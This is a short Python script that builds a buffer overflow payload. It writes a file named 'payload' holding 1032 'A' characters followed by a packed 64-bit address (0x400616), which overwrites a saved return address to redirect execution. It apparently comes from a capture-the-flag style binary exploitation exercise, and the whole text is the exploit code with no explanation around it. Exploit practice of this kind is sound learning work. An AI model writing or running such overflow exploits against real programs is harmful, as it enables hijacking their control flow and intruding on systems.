import struct

def dq(v):
    return struct.pack("Q", v)
with open("payload", "wb") as f:
    f.write("A" * 1032)
    f.write(dq(0x400616))
